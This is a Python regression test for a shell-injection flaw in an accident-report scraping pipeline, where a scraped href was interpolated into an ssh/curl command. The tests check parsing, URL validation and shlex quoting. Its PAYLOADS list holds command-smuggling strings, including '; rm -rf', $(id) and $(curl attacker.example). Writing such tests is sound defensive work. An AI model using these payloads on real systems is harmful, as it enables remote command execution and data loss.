"""The scraped href reaches a remote shell; prove it cannot carry a command.

Regression test for the injection in pipeline.fetch(), where `source_url` —
captured from the ECAA listing page with `[^"]+` — was interpolated into
    ssh HETZNER "curl ... -o '<dest>' '<url>' && wc -c < '<dest>'"
A single quote in the href closed the quoting and ran the remainder on the
fetch host.
"""
import shlex

from eaaid_ingest import eaaid

GUID = "0123abcd-4567-89ab-cdef-0123456789ab"
GOOD = f"/Accident_GenDownloadRes?id={GUID}%5C20240115_003.pdf&name=Accident_Report"


def _listing(href):
    """Minimal listing table with one row carrying `href`."""
    tds = "".join(f"<td>c{i}</td>" for i in range(1, 6))
    return (
        "<tbody><tr>"
        f'<td><a href="{href}">Final</a></td>{tds}'
        "</tr></tbody>"
    )


def test_benign_href_is_accepted():
    events = eaaid.parse_listing_html(_listing(GOOD.replace("&", "&amp;")))
    assert len(events) == 1
    assert events[0]["guid"] == GUID
    assert eaaid.valid_source_url(eaaid.source_url(events[0]["href"]))


PAYLOADS = [
    # closes the single quote, then runs a command
    f"/Accident_GenDownloadRes?id={GUID}%5C'; id #",
    f"/Accident_GenDownloadRes?id={GUID}%5C'$(id)'.pdf",
    f"/Accident_GenDownloadRes?id={GUID}%5C`id`.pdf",
    f"/Accident_GenDownloadRes?id={GUID}%5C_x.pdf'; rm -rf /tmp/x; '",
    f"/Accident_GenDownloadRes?id={GUID}%5C$(curl attacker.example).pdf",
    f"/Accident_GenDownloadRes?id={GUID}%5C|id|.pdf",
    f"/Accident_GenDownloadRes?id={GUID}%5C x.pdf",
]


def test_injection_payloads_never_become_events():
    for payload in PAYLOADS:
        events = eaaid.parse_listing_html(_listing(payload))
        assert events == [], f"payload survived parsing: {payload!r}"


def test_injection_payloads_rejected_as_source_urls():
    """Covers rows already in the DB from before the allowlist landed."""
    for payload in PAYLOADS:
        assert not eaaid.valid_source_url(eaaid.DOWNLOAD_BASE + payload)


def test_quoting_makes_any_string_inert():
    """Second layer: even an accepted-by-mistake value cannot escape."""
    hostile = "x'; id #"
    cmd = f"curl -o {shlex.quote('/tmp/d')} {shlex.quote(hostile)}"
    # the payload survives as one literal argument, no shell syntax leaks out
    assert shlex.split(cmd) == ["curl", "-o", "/tmp/d", hostile]
